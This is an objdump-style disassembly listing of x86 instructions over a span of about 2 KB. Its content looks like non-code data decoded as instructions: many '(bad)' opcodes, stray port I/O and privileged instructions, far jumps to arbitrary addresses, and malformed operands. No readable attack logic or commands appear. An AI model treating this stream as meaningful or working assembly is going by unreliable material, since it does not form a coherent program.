  4122e3:	cmp    al,0xcc
  4122e5:	ja     0x41229d
  4122e7:	inc    ebp
  4122e8:	stc    
  4122e9:	mov    DWORD PTR [eax],edi
  4122eb:	sub    al,0xba
  4122ed:	sahf   
  4122ee:	pusha  
  4122ef:	dec    esi
  4122f0:	icebp  
  4122f1:	icebp  
  4122f2:	das    
  4122f3:	in     eax,0x1f
  4122f5:	add    BYTE PTR [eax+0x2],bl
  4122f8:	(bad)  
  4122f9:	dec    edi
  4122fa:	or     BYTE PTR [ebx],bh
  4122fc:	popa   
  4122fd:	mov    dl,0x22
  4122ff:	std    
  412300:	mov    al,0xdc
  412302:	push   0x25
  412304:	jge    0x412319
  412306:	xchg   esp,eax
  412307:	xchg   BYTE PTR [ebp+0x60c65d74],bl
  41230d:	loope  0x4122e5
  41230f:	fld    TBYTE PTR [ecx-0x376f5225]
  412315:	pop    es
  412316:	adc    bl,BYTE PTR [edi+0x25]
  412319:	stc    
  41231a:	cmp    eax,0x4953f84d
  41231f:	jns    0x412397
  412321:	mov    esp,0x624e88e1
  412326:	or     al,0x26
  412328:	dec    ecx
  412329:	or     al,0xfc
  41232b:	ficomp WORD PTR [ebp+edx*2+0x61ea6c74]
  412332:	inc    eax
  412333:	mov    ds:0x1f09e8df,eax
  412338:	hlt    
  412339:	adc    eax,edx
  41233b:	dec    ebp
  41233c:	or     BYTE PTR [esi+0x33],dl
  41233f:	jae    0x412322
  412341:	enter  0xb8a,0x39
  412345:	inc    edx
  412346:	ror    BYTE PTR [esi+0x63346608],1
  41234c:	lea    esp,ds:0xbba138d0
  412352:	adc    al,bh
  412354:	ss enter 0x6404,0xc5
  412359:	sbb    edx,DWORD PTR [edi]
  41235b:	outs   dx,DWORD PTR ds:[esi]
  41235c:	leave  
  41235d:	sub    eax,0xc44cc3fa
  412362:	jnp    0x412356
  412364:	add    BYTE PTR [ebp+0x4fb68453],bh
  41236a:	or     BYTE PTR [ebp+0x67],0x35
  41236e:	rcl    DWORD PTR [edi],0xd4
  412371:	jmp    0x4123a2
  412373:	imul   esi,DWORD PTR [ebx+0x3fab5b26],0x75
  41237a:	mov    bh,0x2a
  41237c:	mov    dh,0xaa
  41237e:	push   esp
  41237f:	call   0x99e4:0x74f60c0c
  412386:	and    eax,0xcad4ad99
  41238b:	test   eax,0x747c9dbf
  412390:	je     0x41231a
  412392:	dec    eax
  412393:	stos   BYTE PTR es:[edi],al
  412394:	or     eax,0xcc669714
  412399:	pop    es
  41239a:	sahf   
  41239b:	mov    ah,0xfc
  41239d:	adc    al,0x7c
  41239f:	dec    ecx
  4123a0:	cmc    
  4123a1:	jmp    0x412414
  4123a3:	dec    eax
  4123a4:	test   BYTE PTR [ebx-0x62bf26e0],ah
  4123aa:	stos   DWORD PTR es:[edi],eax
  4123ab:	clc    
  4123ac:	dec    eax
  4123ad:	sbb    eax,0xc78efcca
  4123b2:	ffree  st(3)
  4123b4:	fs mov dl,0x57
  4123b7:	inc    esp
  4123b8:	loop   0x41233a
  4123ba:	dec    edi
  4123bb:	xchg   BYTE PTR [eax+eiz*8-0x1e1c2f7b],ah
  4123c2:	jmp    0x747a:0x8f9d
  4123c8:	in     al,dx
  4123c9:	sti    
  4123ca:	adc    al,BYTE PTR [ebx+0x44]
  4123cd:	mov    ebp,0xed9f8788
  4123d2:	xor    eax,0x4db50fb3
  4123d7:	cs popf 
  4123d9:	jg     0x41236b
  4123db:	or     ebx,DWORD PTR ds:0xfd3eba84
  4123e1:	jg     0x412421
  4123e3:	in     al,dx
  4123e4:	(bad)
  4123e7:	add    DWORD PTR [ebx-0x6dc818f0],edi
  4123ed:	scas   al,BYTE PTR es:[edi]
  4123ee:	push   es
  4123ef:	mov    dh,0xa
  4123f1:	out    dx,eax
  4123f2:	or     BYTE PTR [esi+0x7],dl
  4123f5:	inc    ebp
  4123f6:	imul   esi,DWORD PTR [ecx+ebx*1],0x52
  4123fa:	sub    al,0xff
  4123fc:	xchg   DWORD PTR [ebx+0x6b],ebp
  4123ff:	mov    ds:0x21a87ddf,al
  412404:	pusha  
  412405:	adc    BYTE PTR [esp+ecx*8+0x3dde7f83],cl
  41240c:	inc    esi
  41240d:	and    BYTE PTR [edi+ebp*4],0x81
  412411:	std    
  412412:	sub    cl,BYTE PTR [eax-0x53]
  412415:	lahf   
  412416:	pop    ss
  412417:	mov    al,0x92
  412419:	test   al,0xab
  41241b:	fbld   TBYTE PTR [eax+0x6189a6ef]
  412421:	adc    eax,0x684dd74
  412426:	pop    es
  412427:	xchg   edx,eax
  412428:	ror    BYTE PTR [ecx],0xf5
  41242b:	or     eax,0x272ec18c
  412430:	cmp    al,BYTE PTR [edi+eiz*1-0x42e8c9f2]
  412437:	sbb    dh,BYTE PTR [esi]
  412439:	(bad)  
  41243a:	in     al,dx
  41243b:	mov    dl,0xb2
  41243d:	rol    BYTE PTR [edi],1
  41243f:	jl     0x412494
  412441:	leave  
  412442:	xor    ch,dh
  412444:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412445:	pushf  
  412446:	ja     0x4123ff
  412448:	xchg   DWORD PTR [ecx-0x1318077c],ebx
  41244e:	mov    bh,0xb7
  412450:	jl     0x41240a
  412452:	mov    eax,ds:0x2bc87453
  412457:	push   0x568a1749
  41245c:	shr    DWORD PTR [esi+0x4e4670b9],1
  412462:	xor    esp,DWORD PTR [edx]
  412464:	jne    0x412495
  412466:	mov    BYTE PTR [esi-0x60ba5189],cl
  41246c:	inc    ebp
  41246d:	pandn  mm1,QWORD PTR [ecx+eax*1+0x4c]
  412472:	inc    esi
  412473:	dec    edi
  412474:	out    dx,al
  412475:	xchg   ecx,eax
  412476:	in     al,dx
  412477:	dec    esi
  412478:	jbe    0x412432
  41247a:	push   0x53999486
  41247f:	xor    al,0xaf
  412481:	adc    DWORD PTR [esi],0x72ae26da
  412487:	mov    ecx,0x686862f2
  41248c:	or     eax,0x1c95c618
  412491:	popa   
  412492:	add    cl,bh
  412494:	icebp  
  412495:	mov    ah,BYTE PTR [ecx]
  412497:	push   0x3419a68c
  41249c:	int3   
  41249d:	shl    BYTE PTR [ecx-0x67945469],0x48
  4124a4:	test   eax,0xa221858d
  4124a9:	push   ebp
  4124aa:	mov    ecx,ecx
  4124ac:	sub    BYTE PTR ds:0x119b91e,0x98
  4124b3:	je     0x4124b2
  4124b5:	mov    ebx,0x7e2fe1d7
  4124ba:	inc    eax
  4124bb:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124bd:	and    al,0x4b
  4124bf:	rol    BYTE PTR [ebx-0xc],0xe2
  4124c3:	dec    eax
  4124c4:	popf   
  4124c5:	or     bh,BYTE PTR [ebx]
  4124c7:	(bad)  
  4124c8:	jbe    0x41252a
  4124ca:	add    bh,BYTE PTR [esi+0x52]
  4124cd:	ins    BYTE PTR es:[edi],dx
  4124ce:	ret    0xd20f
  4124d1:	repz sbb BYTE PTR [edx+0x3b],ch
  4124d5:	push   eax
  4124d6:	xchg   eax,edi
  4124d8:	push   ebx
  4124d9:	(bad)  
  4124da:	pop    esp
  4124db:	int3   
  4124dc:	je     0x4124ff
  4124de:	pop    esi
  4124df:	dec    esi
  4124e0:	cdq    
  4124e1:	push   edi
  4124e2:	leave  
  4124e3:	add    al,0x2
  4124e5:	shl    DWORD PTR [ebp-0x37],cl
  4124e8:	push   ecx
  4124e9:	push   edi
  4124ea:	pop    ebp
  4124eb:	and    BYTE PTR [ebx],bl
  4124ed:	pop    esp
  4124ee:	iret   
  4124ef:	xchg   ebp,eax
  4124f0:	pop    ds
  4124f1:	jg     0x412523
  4124f3:	scas   eax,DWORD PTR es:[edi]
  4124f4:	loope  0x4124a6
  4124f6:	inc    esi
  4124f7:	bound  eax,QWORD PTR [ebp-0x42150774]
  4124fd:	adc    eax,0xabb837c0
  412502:	xor    al,0x6f
  412504:	ret    
  412505:	cmc    
  412506:	out    0xae,al
  412508:	inc    ecx
  412509:	leave  
  41250a:	cmp    eax,0x957916f6
  41250f:	scas   al,BYTE PTR es:[edi]
  412510:	das    
  412511:	jmp    0xb6250326
  412516:	inc    edi
  412517:	outs   dx,BYTE PTR ds:[esi]
  412518:	cwde   
  412519:	ds stos DWORD PTR es:[edi],eax
  41251b:	jmp    0x4124b9
  41251d:	jne    0x41252e
  41251f:	xchg   esp,eax
  412520:	out    0x8a,eax
  412522:	xlat   BYTE PTR ds:[ebx]
  412523:	mov    ds:0x91c5bf78,eax
  412528:	mov    ebp,0xe1113b58
  41252d:	mov    dh,0x1c
  41252f:	push   ecx
  412530:	sti    
  412531:	arpl   WORD PTR [ebp+0x731ec223],si
  412537:	and    bl,BYTE PTR [ebp-0x76]
  41253a:	(bad)  
  41253b:	pop    eax
  41253c:	js     0x412530
  41253e:	pop    eax
  41253f:	xor    al,0x4
  412541:	push   edx
  412542:	retf   0x1db8
  412545:	adc    al,0xcb
  412547:	sub    ebp,DWORD PTR [esi]
  412549:	fiadd  WORD PTR [eax-0x35]
  41254c:	out    dx,eax
  41254d:	cmp    al,0x6e
  41254f:	xor    ebp,DWORD PTR ds:0x146ec6e6
  412555:	fcmovnbe st,st(5)
  412557:	sbb    eax,0x1bd6f414
  41255c:	rol    ecx,1
  41255e:	xchg   ebp,eax
  41255f:	push   eax
  412560:	lock sahf 
  412562:	cmp    ebx,DWORD PTR [ebp+0x795b8d80]
  412568:	shl    DWORD PTR [esi+0x789f44e1],cl
  41256e:	xchg   edi,eax
  41256f:	sbb    esi,DWORD PTR fs:[edi]
  412572:	stos   BYTE PTR es:[edi],al
  412573:	das    
  412574:	data16 xor al,0xb7
  412577:	clc    
  412578:	sub    DWORD PTR [ecx],0xffffffd9
  41257b:	mov    ah,0x1c
  41257d:	inc    ebp
  41257e:	stos   BYTE PTR es:[edi],al
  41257f:	pop    edi
  412580:	mov    gs,WORD PTR [esi]
  412582:	mov    ah,0xec
  412584:	cmc    
  412585:	aad    0xb5
  412587:	shr    BYTE PTR [edi+eax*8+0x1b561423],cl
  41258e:	cmp    ebx,0x27f4e22c
  412594:	out    0xce,al
  412596:	pop    ecx
  412597:	int    0x22
  412599:	and    BYTE PTR [edi-0x63],dl
  41259c:	and    al,0xa4
  41259e:	or     DWORD PTR [ebx-0x10],eax
  4125a1:	sbb    eax,0x3e881390
  4125a6:	xchg   edi,eax
  4125a7:	icebp  
  4125a8:	mul    DWORD PTR [ebx]
  4125aa:	out    dx,eax
  4125ab:	xor    DWORD PTR [edi+0x57ef39ee],ecx
  4125b1:	int    0xfd
  4125b3:	push   ebp
  4125b4:	sbb    eax,0x8263c75c
  4125b9:	das    
  4125ba:	or     BYTE PTR [ebp-0x4b],al
  4125bd:	arpl   WORD PTR [ecx-0x6b],bp
  4125c0:	ret    
  4125c1:	or     eax,0xc2bcd216
  4125c6:	cs lahf 
  4125c8:	sub    DWORD PTR [eax-0x7b],0xffffffac
  4125cc:	out    dx,eax
  4125cd:	and    esi,DWORD PTR [edi]
  4125cf:	leave  
  4125d0:	outs   dx,BYTE PTR ds:[esi]
  4125d1:	cwde   
  4125d2:	mov    ebx,0xbe3052f1
  4125d7:	or     edx,ecx
  4125d9:	int3   
  4125da:	cli    
  4125db:	cld    
  4125dc:	pop    edi
  4125dd:	loope  0x4125f7
  4125df:	cmp    BYTE PTR [edx+0x6e6f8eda],ah
  4125e5:	push   0xdf6d9acc
  4125ea:	fdivp  st(3),st
  4125ec:	pop    ds
  4125ed:	das    
  4125ee:	fdiv   QWORD PTR [edx+0x724bac2f]
  4125f4:	or     ah,BYTE PTR [esi]
  4125f6:	ins    BYTE PTR es:[edi],dx
  4125f7:	(bad)  
  4125f9:	stos   BYTE PTR es:[edi],al
  4125fa:	adc    WORD PTR [eax-0x33d067f],cx
  412601:	xchg   edi,eax
  412602:	cmp    DWORD PTR [edi-0x4d],eax
  412605:	jae    0x4125b9
  412607:	aam    0x65
  412609:	xor    ebx,esi
  41260b:	cld    
  41260c:	sbb    al,0x20
  41260e:	jp     0x4125d1
  412610:	bound  edx,QWORD PTR [ecx]
  412612:	cmp    DWORD PTR [edx],ebp
  412614:	dec    esi
  412615:	out    0x7a,eax
  412617:	sbb    eax,0x5d038976
  41261c:	inc    edi
  41261d:	ja     0x41267c
  41261f:	mov    ds:0xda142e0e,eax
  412624:	jae    0x412608
  412626:	xchg   edx,eax
  412627:	add    ah,BYTE PTR [ebp+eax*2-0x20]
  41262b:	xchg   edx,eax
  41262c:	pop    esp
  41262d:	shl    DWORD PTR [ecx+ebx*4-0x614b49aa],0x40
  412635:	fdiv   DWORD PTR [esi-0x56005e8b]
  41263b:	xlat   BYTE PTR ds:[ebx]
  41263c:	lds    esp,FWORD PTR [ebx-0x53]
  41263f:	mov    ecx,0x43513994
  412644:	pop    ds
  412645:	xchg   ebp,eax
  412646:	pop    ebx
  412647:	sbb    cl,BYTE PTR [ecx+0x77]
  41264a:	inc    ebx
  41264b:	jp     0x4125df
  41264d:	je     0x412689
  41264f:	sub    al,0x16
  412651:	mov    edi,0x3d991106
  412656:	call   0x4445:0x5c657c5
  41265d:	int3   
  41265e:	jnp    0x4126d7
  412660:	icebp  
  412661:	mov    ?,WORD PTR [eax+ebx*2]
  412664:	add    BYTE PTR [edx+0x54],dh
  412667:	cld    
  412668:	in     al,0x64
  41266a:	inc    esi
  41266b:	pop    es
  41266c:	add    al,0xd9
  41266e:	lock xchg ecx,eax
  412670:	xchg   ebp,eax
  412671:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412672:	pop    esp
  412673:	out    dx,al
  412674:	cmp    bh,BYTE PTR [ecx]
  412676:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412677:	(bad)  
  412678:	lahf   
  412679:	jbe    0x412673
  41267b:	cmp    ebp,DWORD PTR [ebx]
  41267d:	rol    DWORD PTR [ebp+0x16],1
  412680:	in     eax,0xcd
  412682:	mov    esp,DWORD PTR [edx*2-0x349716c2]
  412689:	mov    al,ds:0x3ea97a1a
  41268e:	mov    bh,0xfd
  412690:	jmp    0x23e3e688
  412695:	imul   esp,DWORD PTR [esi+0x78],0xf40800de
  41269c:	mov    ds:0x155ccb2c,al
  4126a1:	sbb    BYTE PTR [ebx+0x679e6bf4],dh
  4126a7:	xor    al,0x72
  4126a9:	jns    0x412631
  4126ab:	mov    edx,0x2078059f
  4126b0:	cld    
  4126b1:	mov    ah,0xdd
  4126b3:	retf   0xdcf0
  4126b6:	xchg   ebx,eax
  4126b7:	sbb    al,0x4f
  4126b9:	iret   
  4126ba:	xlat   BYTE PTR ds:[ebx]
  4126bb:	(bad)  
  4126bc:	das    
  4126bd:	sub    edi,DWORD PTR [edx]
  4126bf:	adc    cl,BYTE PTR [ebp-0x73f489ae]
  4126c5:	and    DWORD PTR [ecx+0x6e47ba3b],esp
  4126cb:	jno    0x4126d5
  4126cd:	mov    al,ds:0x8936c6f5
  4126d2:	test   al,0x7d
  4126d4:	pusha  
  4126d5:	push   0xffffffc4
  4126d7:	adc    eax,0xdea9d026
  4126dc:	fwait
  4126dd:	aad    0xa
  4126df:	adc    ecx,DWORD PTR fs:[edi-0x67]
  4126e3:	pop    ds
  4126e4:	js     0x41271b
  4126e6:	cmp    ah,BYTE PTR [edi+0x3a14d2f4]
  4126ec:	mov    ds:0x3e70da3f,eax
  4126f1:	cmp    eax,esi
  4126f3:	xor    BYTE PTR [ecx+0x47245d92],bh
  4126f9:	adc    dl,ah
  4126fb:	xor    BYTE PTR [ecx-0x1],dh
  4126fe:	adc    bh,BYTE PTR [ebx+0x7d]
  412701:	ins    DWORD PTR es:[edi],dx
  412702:	adc    edi,DWORD PTR [edx]
  412704:	jp     0x412780
  412706:	push   ecx
  412707:	cwde   
  412708:	mov    ?,WORD PTR [ebp-0x75]
  41270b:	in     eax,0x16
  41270d:	pop    ss
  41270e:	in     al,0x9c
  412710:	stos   DWORD PTR es:[edi],eax
  412711:	cmp    eax,0xc5a4b2c5
  412716:	xchg   esp,eax
  412717:	inc    ebx
  412718:	ret    
  412719:	and    al,0x68
  41271b:	cmp    edx,DWORD PTR [eiz*4+0x5407262f]
  412722:	lea    esi,[edx+0x28]
  412725:	in     eax,dx
  412726:	int    0x5a
  412728:	sar    BYTE PTR [edi+0x341028e1],1
  41272e:	sub    DWORD PTR [ecx],edi
  412730:	popf   
  412731:	push   ebx
  412732:	inc    esp
  412733:	aad    0xa8
  412735:	xchg   ebp,eax
  412736:	dec    ecx
  412737:	dec    ecx
  412738:	cwde   
  412739:	test   eax,0xf06899dd
  41273e:	mov    eax,ds:0x7cd9e65
  412743:	fsubr  st,st(5)
  412745:	push   ecx
  412746:	arpl   cx,bx
  412748:	xor    ebx,DWORD PTR [eax]
  41274a:	gs ja  0x41270c
  41274d:	pop    ss
  41274e:	xchg   ebx,eax
  41274f:	xor    eax,0xeb824ab9
  412754:	(bad)  
  412755:	and    al,0xbe
  412757:	ins    DWORD PTR es:[edi],dx
  412758:	stos   BYTE PTR es:[edi],al
  412759:	xchg   edx,eax
  41275a:	pop    esi
  41275b:	fld    QWORD PTR ds:0x528a9058
  412761:	jbe    0x4127a5
  412763:	and    bh,BYTE PTR [edi]
  412765:	jg     0x412762
  412767:	pop    edx
  412768:	push   ss
  412769:	or     eax,0x7c85afbe
  41276e:	lds    ebx,FWORD PTR [eax+esi*4+0x419f343c]
  412775:	outs   dx,BYTE PTR ds:[esi]
  412776:	add    DWORD PTR ds:0x2829e3c9,eax
  41277c:	or     eax,0x78ef5c73
  412781:	pop    edx
  412782:	hlt    
  412783:	jmp    0x412730
  412785:	mov    ebx,0x94fae1d4
  41278a:	adc    BYTE PTR [ecx],ah
  41278c:	jno    0x412778
  41278e:	ficomp DWORD PTR [edi-0x6]
  412791:	pop    eax
  412792:	adc    eax,0x761004b0
  412797:	mov    dh,0xe1
  412799:	in     al,dx
  41279a:	xchg   ebp,eax
  41279b:	adc    al,0xc4
  41279d:	inc    esi
  41279e:	popf   
  41279f:	push   ds
  4127a0:	adc    BYTE PTR [ecx+0x79],bh
  4127a3:	pop    ebx
  4127a4:	rcr    ebp,0x81
  4127a7:	pop    edi
  4127a8:	repnz push esp
  4127aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127ab:	push   ss
  4127ac:	sub    al,0x8d
  4127ae:	lods   al,BYTE PTR ds:[esi]
  4127af:	stos   BYTE PTR es:[edi],al
  4127b0:	popf   
  4127b1:	inc    ecx
  4127b2:	adc    ah,BYTE PTR [ebx+0x0]
  4127b5:	sbb    esp,DWORD PTR [edi]
  4127b7:	cmp    bl,ch
  4127b9:	dec    edx
  4127ba:	aaa    
  4127bb:	inc    esp
  4127bc:	dec    edi
  4127bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127be:	(bad)  
  4127bf:	cld    
  4127c0:	inc    eax
  4127c1:	xchg   esp,eax
  4127c2:	mov    bh,0x6a
  4127c4:	cmc    
  4127c5:	push   ss
  4127c6:	fcomp  DWORD PTR [eax]
  4127c8:	mov    cl,0xcd
  4127ca:	int    0x16
  4127cc:	pop    ds
  4127cd:	mov    al,0xb9
  4127cf:	jmp    0xb464f279
  4127d4:	ret    
  4127d5:	in     al,dx
  4127d6:	loopne 0x4127ec
  4127d8:	cmp    bl,dl
  4127da:	or     eax,0x11f3fea1
  4127df:	(bad)  
  4127e0:	hlt    
  4127e1:	aam    0x72
  4127e3:	and    eax,0xb7008df
  4127e8:	add    al,0xec
  4127ea:	cmp    BYTE PTR [ebx-0xf],ah
  4127ed:	aaa    
  4127ee:	cwde   
  4127ef:	jbe    0x412785
  4127f1:	imul   edi,DWORD PTR [ecx+0x724cc551],0x25
  4127f8:	pop    edi
  4127f9:	sti    
  4127fa:	push   eax
  4127fb:	or     edi,DWORD PTR [edi]
  4127fd:	ins    BYTE PTR es:[edi],dx
  4127fe:	xor    dh,BYTE PTR [ebp-0x60afa913]
  412804:	outs   dx,DWORD PTR ds:[esi]
  412805:	lahf   
  412806:	pop    ebx
  412807:	jo     0x4127f5
  412809:	scas   eax,DWORD PTR es:[edi]
  41280a:	ds jl  0x412799
  41280d:	rol    BYTE PTR [esi],cl
  41280f:	push   edx
  412810:	xchg   edi,eax
  412811:	pushf  
  412812:	pop    esi
  412813:	cdq    
  412814:	in     eax,0xfd
  412816:	adc    BYTE PTR [ecx+0x72],dh
  412819:	fstp   TBYTE PTR [esi-0xc]
  41281c:	out    0x23,al
  41281e:	pop    esp
  41281f:	mov    DWORD PTR [esi+ebp*1-0x5e2d5d91],eax
  412826:	mov    eax,0x7a7cc225
  41282b:	jg     0x4127f2
  41282d:	cmp    BYTE PTR [eax],dh
  41282f:	imul   eax,DWORD PTR [ecx],0x8c0d9b57
  412835:	push   es
  412836:	iret   
  412837:	sbb    al,0x5e
  412839:	adc    al,0xce
  41283b:	add    edx,DWORD PTR [edx+0x36a07104]
  412841:	arpl   WORD PTR [ecx+0x287c2e01],ax
  412847:	xchg   ebx,eax
  412848:	das    
  412849:	sti    
  41284a:	stc    
  41284b:	jecxz  0x41281b
  41284d:	cli    
  41284e:	adc    BYTE PTR [edi+0x2409afd1],dl
  412854:	sub    al,bl
  412856:	pop    ebp
  412857:	add    ebp,DWORD PTR [ebp+0x5bc6b661]
  41285d:	scas   al,BYTE PTR es:[edi]
  41285e:	stc    
  41285f:	sub    BYTE PTR [edx-0x3c351f6],bl
  412865:	clc    
  412866:	std    
  412867:	out    dx,al
  412868:	ss test eax,0x5ef7fb8
  41286e:	cs ret 
  412870:	push   edx
  412871:	loope  0x4128dd
  412873:	pop    es
  412874:	sub    al,0x1c
  412876:	test   eax,0xce4cda2a
  41287b:	aam    0x1b
  41287d:	mov    dh,0xb9
  41287f:	mov    dh,dl
  412881:	mov    al,ds:0xf7c17ac7
  412886:	mov    BYTE PTR [edi+0x25],bl
  412889:	push   es
  41288a:	dec    edx
  41288b:	in     al,0x1d
  41288d:	leave  
  41288e:	sbb    bl,0x13
  412891:	mov    ebx,0xb1a60b6c
  412896:	ins    DWORD PTR es:[edi],dx
  412897:	(bad)  
  412898:	sub    ebx,DWORD PTR [edx]
  41289a:	fs fs xchg edi,eax
  41289d:	inc    eax
  41289e:	push   esi
  41289f:	sbb    al,0x4
  4128a1:	aas    
  4128a2:	mov    esi,0xa245c379
  4128a7:	add    dh,al
  4128a9:	jg     0x4128b5
  4128ab:	mov    ebp,DWORD PTR [esi+0x58e3c74d]
  4128b1:	jno    0x4128df
  4128b3:	pop    ds
  4128b4:	std    
  4128b5:	retf   
  4128b6:	imul   eax,edx,0xaeeabbbb
  4128bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128bd:	rol    DWORD PTR [bp+di],cl
  4128c0:	(bad)  
  4128c1:	sub    BYTE PTR [esi-0x80],0xf2
  4128c5:	jae    0x41290b
  4128c7:	xor    eax,0xaf6c3921
  4128cc:	or     ecx,DWORD PTR [edx-0x2e]
  4128cf:	or     BYTE PTR [edi],bl
  4128d1:	jp     0x41294e
  4128d3:	adc    esp,esp
  4128d5:	mov    ds:0x4f473be0,eax
  4128da:	xchg   ecx,eax
  4128db:	add    BYTE PTR [ebx],cl
  4128dd:	dec    ebx
  4128de:	inc    eax
  4128df:	xchg   ebx,eax
  4128e0:	adc    ch,BYTE PTR ds:0x60efec27
  4128e6:	xchg   BYTE PTR ds:0x85752461,bl
  4128ec:	mov    ebx,0xeaa0dcf4
  4128f1:	inc    ebp
  4128f2:	xchg   esp,eax
  4128f3:	mov    edi,0xaaf139
  4128f8:	jmp    0xeeef1ba5
  4128fd:	popf   
  4128fe:	xchg   BYTE PTR [eax-0xf14aa1],ch
  412904:	xchg   ebx,eax
  412905:	fmul   DWORD PTR [ebp+0x0]
  412908:	or     BYTE PTR [ebp+0x4c3620c2],al
  41290e:	rol    bh,cl
  412910:	scas   eax,DWORD PTR es:[edi]
  412911:	xchg   ecx,eax
  412912:	cmp    BYTE PTR [esi+0x44],bl
  412915:	lahf   
  412916:	not    DWORD PTR ds:0x24da7e6e
  41291c:	aad    0xd1
  41291e:	mov    ?,ebx
  412920:	xchg   edi,eax
  412921:	ins    BYTE PTR es:[edi],dx
  412922:	add    ch,0xe
  412925:	inc    eax
  412926:	daa    
  412927:	dec    edx
  412928:	pop    es
  412929:	shl    DWORD PTR [esi+0x40],1
  41292c:	fdivr  st,st(2)
  41292e:	xlat   BYTE PTR ds:[ebx]
  41292f:	das    
  412930:	loop   0x4129a0
  412932:	or     BYTE PTR [esi-0x66],dh
  412935:	dec    DWORD PTR [ecx+0x0]
  412938:	ds and BYTE PTR cs:[eax-0x5c],0x84
  41293e:	pop    edi
  41293f:	xchg   esp,eax
  412940:	stc    
  412941:	mov    ds:0x59af11ac,al
  412946:	call   DWORD PTR [ebp+0x7d6ab215]
  41294c:	ret    0x6679
  41294f:	mov    ebx,0x638feaf3
  412954:	or     BYTE PTR [eax-0x22],0xa8
  412958:	idiv   BYTE PTR [esi]
  41295a:	cmp    eax,0x2699366b
  41295f:	hlt    
  412960:	in     al,0xb5
  412962:	xor    bl,BYTE PTR [ecx]
  412964:	shl    BYTE PTR [eax],0x8d
  412967:	imul   dh
  412969:	push   edx
  41296a:	xchg   edi,eax
  41296b:	aad    0x4f
  41296d:	pop    edi
  41296e:	inc    ebp
  41296f:	fucomip st,st(1)
  412971:	arpl   WORD PTR [ebx],bp
  412973:	loope  0x4129f0
  412975:	pusha  
  412976:	ret    
  412977:	idiv   al
  412979:	scas   al,BYTE PTR es:[edi]
  41297a:	inc    ebp
  41297b:	in     al,dx
  41297c:	sar    ebp,0x4f
  41297f:	cli    
  412980:	pop    edx
  412981:	addr16 mov bh,0x8a
  412984:	jle    0x412993
  412986:	add    DWORD PTR [edi+ebp*2],0x465e022d
  41298d:	arpl   WORD PTR [eax+0x4a00a6d1],ax
  412993:	cmp    DWORD PTR [ecx-0x701e61b0],0x3a861979
  41299d:	stos   DWORD PTR es:[edi],eax
  41299e:	pop    ebp
  41299f:	xor    ebp,DWORD PTR [ebx]
  4129a1:	jmp    0x412969
  4129a3:	in     eax,0x5a
  4129a5:	or     BYTE PTR [ecx+0x51],dl
  4129a8:	rol    BYTE PTR [eax-0x7e758ac],1
  4129ae:	(bad)  
  4129af:	mov    ds:0x741cb4ef,al
  4129b4:	(bad)  [edx]
  4129b6:	fstp   QWORD PTR [ebp-0x30]
  4129b9:	cdq    
  4129ba:	push   0xffffffae
  4129bc:	mov    al,0xf1
  4129be:	and    al,0x43
  4129c0:	mov    cl,BYTE PTR [edx-0x1f8eadf3]
  4129c6:	in     al,0x3e
  4129c8:	dec    esi
  4129c9:	fadd   DWORD PTR [ebp-0x789bd978]
  4129cf:	fisub  WORD PTR ds:0x4414b4cd
  4129d5:	push   es
  4129d6:	icebp  
  4129d7:	(bad)  
  4129d8:	push   ebp
  4129d9:	call   0xad26603
  4129de:	pop    ebp
  4129df:	aaa    
  4129e0:	sbb    bl,ah
  4129e2:	pop    esi
  4129e3:	jecxz  0x41296f
  4129e5:	cmp    DWORD PTR [edi],edi
  4129e7:	jmp    0x412a15
  4129e9:	fistp  WORD PTR [ebp-0x7a]
  4129ec:	arpl   WORD PTR [eax],bp
  4129ee:	cmp    eax,0x8d5bf51c
  4129f3:	pushf  
  4129f4:	stos   BYTE PTR es:[edi],al
  4129f5:	jne    0x412a71
  4129f7:	sbb    DWORD PTR [eax-0x4918c1c2],ebx
  4129fd:	hlt    
  4129fe:	mov    eax,0x3ef080e5
  412a03:	push   ecx
  412a04:	mov    bh,0x27
  412a06:	das    
  412a07:	jmp    0xb66d:0x8ba52a3d
  412a0e:	out    dx,al
  412a0f:	push   cs
  412a10:	and    DWORD PTR [esi-0x61],edx
  412a13:	and    DWORD PTR [ebx+ebx*2],esp
  412a16:	dec    edi
  412a17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a18:	js     0x4129b1
  412a1a:	cld    
  412a1b:	into   
  412a1c:	lock jo 0x412a34
  412a1f:	sbb    eax,0x6d9486f2
  412a24:	dec    ebp
  412a25:	xlat   BYTE PTR ds:[ebx]
  412a26:	mov    BYTE PTR [eax-0x70],bl
  412a29:	sub    DWORD PTR [edx],esp
  412a2b:	xchg   edx,eax
  412a2c:	(bad)  
  412a2d:	push   cs
  412a2e:	dec    ebx
  412a2f:	arpl   WORD PTR [esi+edi*1-0x72],bp
  412a33:	lods   al,BYTE PTR ds:[esi]
  412a34:	or     eax,0x920b864e
  412a39:	sbb    BYTE PTR [ebx+0x25],bh
  412a3c:	sbb    DWORD PTR [ecx+0x1b],esi
  412a3f:	mov    ebp,0xfe23bdae
  412a44:	inc    eax
  412a45:	adc    ebp,DWORD PTR [esi-0x4d7dcf40]
  412a4b:	scas   al,BYTE PTR es:[edi]
  412a4c:	cmp    ch,ch
  412a4e:	pop    edi
  412a4f:	cli    
  412a50:	or     bh,ch
  412a52:	mov    WORD PTR [eax-0x62001aac],ds
  412a58:	inc    edx
  412a5a:	adc    DWORD PTR [esp+eiz*2],0xffffffe6
  412a5e:	mov    ch,0x2f
  412a60:	sbb    edx,DWORD PTR ds:0xe9677887
  412a66:	js     0x412ab6
  412a68:	xchg   ebx,eax
  412a69:	jle    0x412a62
  412a6b:	inc    esi
  412a6c:	push   esi
  412a6d:	sbb    al,0xff
  412a6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a70:	fisttp DWORD PTR [esi-0x4b]
  412a73:	iret   
  412a74:	adc    eax,0xb17ab29f
  412a79:	data16 lahf 
  412a7b:	push   ecx
  412a7c:	xchg   BYTE PTR [edx+0x20c69abb],ch
  412a82:	outs   dx,DWORD PTR ds:[esi]
  412a83:	dec    ecx
  412a84:	mov    eax,ds:0xf7fe3c54
  412a89:	and    ah,dl
  412a8b:	jne    0x412a95
